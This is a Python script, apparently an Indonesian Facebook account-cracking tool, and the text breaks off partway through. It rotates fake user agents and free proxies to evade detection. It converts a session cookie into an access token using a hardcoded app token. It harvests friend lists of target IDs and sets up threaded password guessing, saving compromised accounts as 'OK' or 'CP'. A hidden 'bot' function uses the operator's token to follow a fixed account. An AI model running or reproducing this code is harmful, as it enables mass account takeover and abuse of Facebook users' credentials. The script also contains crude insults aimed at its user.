#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
entot=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 8 Pro',f'CPH229',f'21121119SG',f'RMX3710',f'TECNO KE5',f'CPH2185'])
	d=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(80,106)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}.{h}.{i}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (X11; Linux x86_64)'
	b=random.choice(['8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 8 Pro',f'CPH229',f'21121119SG',f'RMX3710',f'TECNO KE5',f'CPH2185'])
	d=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(80,106)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}.{h}.{i}'
	ugen.append(uaku2)

	rr = random.randint
	rc = random.choice
	infinix=random.choice(["Infinix Hot 10","Infinix X688B","Infinix X682B","Infinix X658E","Infinix PR652B","Infinix X659B","Infinix X689","Infinix X689D","Infinix X662","Infinix X6816D"])
	realme= random.choice(["RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901"])
	redmi = random.choice(["Mi 11 Lite 5G","Redmi Go","Mi 9T","Redmi Note 12 Pro+ 5G","Redmi Note 8T","Mi 10T","Xiaomi 12T","Mi 10","Redmi 6","MI MAX 3","Redmi Note 10 Pro","Redmi Note 9 Pro","Redmi 9 Pro","Redmi S2","POCO X3 NFC","Redmi 10C","Redmi Note 11S","M2006C3MG MIUI/V12.0.18.0.QCRMXAT","POCO X3 GT"," Redmi 7A","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"])
	oppo = random.choice(["zh-TW; PERM10","OPPO A73","PEFM00","A201OP","PDCM00","PCHM00","OPPO A73","PEFM00","CPH2185","OPPO A79k","CPH2525","PESM10","PBCM30","OPPO A73t","OPPO A59st","PEAT00","Reno 9 Pro+","Reno 5 Pro Plus 5G","R819T","R8205","R8207","R823T","R829","R829T","R830","R830S","R833T","R2001","R2010","R2017","CNM632","CPH1114","CPH1235","CPH1451","CPH1615","CPH1664","CPH1869","CPH1929","CPH1985","CPH2048","CPH2107","CPH2238","CPH2261","CPH2331","CPH2332","CPH2351","CPH2389","CPH2419","CPH2451","CPH2465","CPH2467","CPH2513","CPH2515","CPH2521","CPH2525","CPH2529","CPH2531","CPH2589","CPH2643","CPH3475","CPH3669","CPH3682","CPH3731","CPH3776","CPH3785","CPH4125","CPH4275","CPH4299","CPH4395","CPH4473","CPH4987","CPH5286","CPH5841","CPH5947","CPH6178","CPH6244","CPH6271","CPH6316","CPH6519","CPH6528","CPH6697","CPH7338","CPH7364","CPH7382","CPH7532","CPH7577","CPH7991","CPH8153","CPH8346","CPH8347","CPH8363","CPH8393","CPH8467","CPH8472","CPH8534","CPH8686","CPH8893","CPH9177","CPH9226","CPH9659","CPH9667","CPH9716","CPH9763","CPH9929"])
	b1 = random.choice(['OPM1','OPM2','OPM3','OPM4','OPM5','OPM6','OPD1','QD1A','OPR6','TPR1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
	b2 = random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
	a1 = random.choice(["A","S","T","X","+"])
	a2 = random.choice(["gn","go"])
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; {infinix} Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36"
	ua2 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; {realme} Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 RealmeBrowser/{str(rr(10,45))}.{str(rr(1,9))}.0.{str(rr(1,20))}"
	ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; {redmi} Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2}"
	ua4 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; {oppo} Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 HeyTapBrowser/{str(rr(2,45))}.{str(rr(5,9))}.{str(rr(1,36))}.{str(rr(1,4))}"
	ua5 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,15))}; fr-fr; Redmi Note {str(rr(3,14))}{a1}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2}"
	ua6 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; Redmi Note {str(rr(3,14))}{a1}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2}"
	ua7 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; POCO M2 Pro Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36"
	ua8 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; POCO F2 Pro Build/{b1}.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(4000,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
	ua9 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; SUPER-ID Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4000,4900))}.{str(rr(75,150))} Mobile Safari/537.36 OPT/1.7.21"
	ua10 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; Huawei P20 Lite Build/PQ3A.{str(rr(111111,210000))}.{b2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4000,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
	ua11 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(111,114))}.0.0.0 Mobile Safari/537.36"
	ua12 = f"Mozilla/5.0 (Windows NT {str(rr(3,15))}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Safari/537.36 Edg/113.0.1774.57"
	ua13 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; Redmi 890T Build/TQ1A.442564.078; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2};]"
	ua14 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; Nokia Asha 717G Build/TP1A.963538.045; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2};]"
	ua15 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; SM-A695B Build/TQ1A.114077.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2};]"
	ua16 = f"Mozilla/5.0 (Linux; Android {str(rr(3,15))}; Nokia NX486 Max Build/RQ1A.478817.083; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(3000,5999))}.{str(rr(10,299))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{a2};"
	uaku2 = random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10, ua11, ua12, ua13, ua14, ua15, ua16])
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	a = random.choice(["4","5","6","7","8","9","10","11","12","13","9.0","9.0.1","6.0","6.2.1","4.0.2","5.0.2","6.0.1","7.0.1","7.0","8.1.0","4.4.4","6.0.3"])
	b = random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
	c='COLMEK-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {a}; {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	entot.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,H,p])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	os.system('clear')
	print(f"""
 ____  __  _  _  ____  __    ____ 
/ ___)(  )( \/ )(  _ \(  )  (  __)
\___ \ )( / \/ \ ) __// (_/\ ) _) 
(____/(__)\_)(_/(__)  \____/(____)
\tSecrip By:FRENDY_DEV{x}""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print(f'\n[!] Login  berhasil harap tunggu sebentar !!!')
					os.system('python nyet.py')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/61550040690238?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	print(f'[{H}>>{N}] Selamat Datang {H}%s{x} Goblokkk'%(my_name))
	print(f'[{H}>>{N}] Your Idz : {my_id}\n[{H}>>{N}] Your Ip : {ip}')
	print('')
	print(f'[{H}01{N}].Crack Publik')
	print(f'[{H}02{N}].Hasil Crack')
	print(f'[{H}03{N}].Cek Opsi')
	print(f'[{H}04{N}].Pasang A2F')
	print(f'[{H}05{N}].Keluar')
	_____alvino__adijaya_____ = input('\n[?] Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		result()
	elif _____alvino__adijaya_____ in ['3']:
		os.system('python opsi.py')
	elif _____alvino__adijaya_____ in ['4']:
		os.system('python main.py')
	elif _____alvino__adijaya_____ in ['5']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('<•> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('<•> Pilih Yang Bener Tod ')
		back()
def error():
	print(f'{k}<•> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{H}01{N}].Hasil {h}OK{x} Anda ')
	print(f'[{H}02{N}].Hasil {k}CP{x} Anda ')
	print('[{H}03{N}].Kembali	')
	kz = input(f'\n<•> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('<•> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('<•> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'<•> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n<•> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('<•> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('<•> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}<•> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('<•> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('<•> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'<•> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'<•> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('<•> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('<•> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}<•> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('<•> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[?].Mau Berapa Target Asu ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[>] Masukkan ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('<•> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'[>] ID Terkumpul🙈{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('<•> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{P}[{H}1{N}] Id Old To New{N}\n[{H}2{N}] Id New To Old {N}({H}Recommended{N})\n[{H}3{N}] Id Random{N}')
	hu = input('[?] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('<•> Pilih Yang Bener Kontooll ')
		exit()
	print('')
	print(f'[{H}01{N}].M.facebook.com')
	print('')
	hc = input('[?] Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('<•> Pilih Yang Bener Kontol ')
		setting()
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('[?]Tambahkan Aplikasi ( Y/t ) ')
	if _jembot_ in ['']:
		print('<•> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('[?].Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[>] Enter Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'[{H}>{N}] {H}OK{N} SAVE IN {H}OK/{okc}{N}\n[{K}>{N}] {K}CP{N} SAVE IN {K}CP/{cpc}{N}\n[{M}>{N}] Mainkan Mode {H}✈{N} Setiap 500 ID')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
